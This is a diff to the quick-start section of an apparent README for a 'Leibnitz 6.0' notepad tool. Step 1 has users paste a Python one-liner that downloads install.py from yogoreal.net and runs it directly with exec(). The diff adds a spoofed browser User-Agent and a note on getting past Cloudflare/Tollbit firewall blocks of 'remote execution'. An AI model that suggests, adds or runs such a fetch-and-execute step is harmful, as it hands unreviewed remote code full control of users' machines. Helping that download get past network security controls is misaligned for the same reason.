@@ -17,7 +17,13 @@ If you just want to launch Leibnitz 6.0 right now with zero configuration, follo
 this standard 4-step preliminary default path:
 
 Step 1: Open any terminal (Command Prompt, PowerShell, or Terminal) and run:
-  python -c "import urllib.request; exec(urllib.request.urlopen('https://yogoreal.net/install.py').read())"
+
+  python -c "import urllib.request; req=urllib.request.Request('https://yogoreal.net/install.py', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}); exec(urllib.request.urlopen(req).read())"
+
+  [Note on Cloudflare / Tollbit WAF]:
+  If your network environment or firewall blocks remote execution with HTTP 493/403, 
+  simply run the direct local installer command instead:
+    python remote_install.py
 
 Step 2: Double-click the generated desktop shortcut "StructuredNotepad_v4.bat" 
   (or run: python -m structured_notepad_ext.notepad_app).
